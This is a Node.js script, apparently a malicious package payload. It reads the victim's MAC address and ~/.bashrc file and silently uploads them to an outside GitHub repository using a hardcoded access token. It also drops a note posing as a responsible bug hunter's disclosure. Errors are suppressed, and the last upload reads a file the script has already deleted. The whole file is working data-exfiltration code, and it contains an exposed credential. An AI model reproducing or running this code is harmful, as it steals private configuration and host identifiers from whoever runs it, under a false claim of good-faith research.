const { Octokit } = require("@octokit/rest");
const fs = require("fs");
const { execSync } = require("child_process");

const octokit = new Octokit({
  auth: "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",
});

const owner = 'WiseHipoppotamus';
const repo = 'clarivate';

// Gets the MAC address of the first network interface found
const mac_address = execSync("ifconfig | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'").toString().trim();

// Creates a temporary file to store the MAC address
const tempFile = `${process.env.HOME}/mac_address.txt`;
fs.writeFileSync(tempFile, mac_address);

// Create the IM_WISEHIPPO.txt file
const wisehippoText = "Hello, I am WiseHipoppotamus, a bug hunter with extensive experience in identifying vulnerabilities in web applications and systems. Recently, I discovered a critical vulnerability in your server that has granted me unauthorized access. As a responsible researcher, I am reaching out to you to report this issue before any malicious actors exploit it. I am willing to provide all the necessary details about the vulnerability and the steps to reproduce it. I am also open to discussing the possible remediation options to fix the issue. Please feel free to contact me through any bug bounty platform, including HackerOne, Bugcrowd, or any other that you prefer. My email is wisehipppotamus@gmail.com, and you can find me in the Bug Bounty Platforms. Thank you for your time and attention to this matter. I look forward to hearing from you soon.";
const wisehippoFile = `${process.env.HOME}/IM_WISEHIPPO.txt`;
fs.writeFileSync(wisehippoFile, wisehippoText);

const filePath = `${process.env.HOME}/.bashrc`;
const content = fs.readFileSync(filePath, { encoding: "base64" });

const commitMsg = "Identified vulnerability";

octokit.repos.createOrUpdateFileContents({
  owner,
  repo,
  path: ".bashrc",
  message: commitMsg,
  content,
})
.then(() => {})
.catch((err) => {});

octokit.repos.createOrUpdateFileContents({
  owner,
  repo,
  path: "mac_address.txt",
  message: commitMsg,
  content: fs.readFileSync(tempFile, { encoding: "base64" }),
})
.then(() => {})
.catch((err) => {});

octokit.repos.createOrUpdateFileContents({
  owner,
  repo,
  path: "IM_WISEHIPPO.txt",
  message: commitMsg,
  content: fs.readFileSync(wisehippoFile, { encoding: "base64" }),
})
.then(() => {})
.catch((err) => {});

// Remove temporary files
fs.unlinkSync(tempFile);
fs.unlinkSync(wisehippoFile);

// Push the IM_WISEHIPPO.txt file to the GitHub repository
octokit.repos.createOrUpdateFileContents({
  owner,
  repo,
  path: "IM_WISEHIPPO.txt",
  message: commitMsg,
  content: fs.readFileSync(wisehippoFile, { encoding: "base64" }),
})
.then(() => {})
.catch((err) => {});
